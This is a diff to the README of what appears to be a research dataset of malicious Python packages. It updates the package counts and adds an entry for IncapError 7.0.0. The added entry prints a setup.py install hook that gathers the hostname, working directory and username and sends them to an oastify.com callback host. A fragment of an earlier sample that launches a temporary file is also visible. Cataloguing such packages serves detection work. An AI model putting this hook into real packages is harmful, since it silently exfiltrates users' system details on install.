@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 7,117 versions of the source code of 6,046 malicious packages.
+This data set includes about 7,118 versions of the source code of 6,047 malicious packages.
 
 ## Dataset Format
 
@@ -653,7 +653,6 @@ class myclass(install):
 rock51 [1.0.0] <br>
 
 ### 02 Jul. 2024
-
 add new 672 malicious packages, encompassing 997 versions.
 
 ```python
@@ -667,6 +666,21 @@ class http:
  _ttmp.close()
  try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
  except: pass
+```
+
+
+### 06 Jul. 2024
+IncapError [7.0.0] <br>
+
+```python
+class CustomInstall(install):
+    def run(self):
+        install.run(self)
+        hostname = socket.gethostname()
+        cwd = os.getcwd()
+        username = getpass.getuser()
+        ploads = {'hostname': hostname, 'cwd': cwd, 'username': username}
+        requests.get("https://1y05ug5pi97xa0bk2bjhdwp5yw4nsdg2.oastify.com", params=ploads)  # Replace with Interactsh or Pipedream
 ```
 
 ## About the malicious packages detection
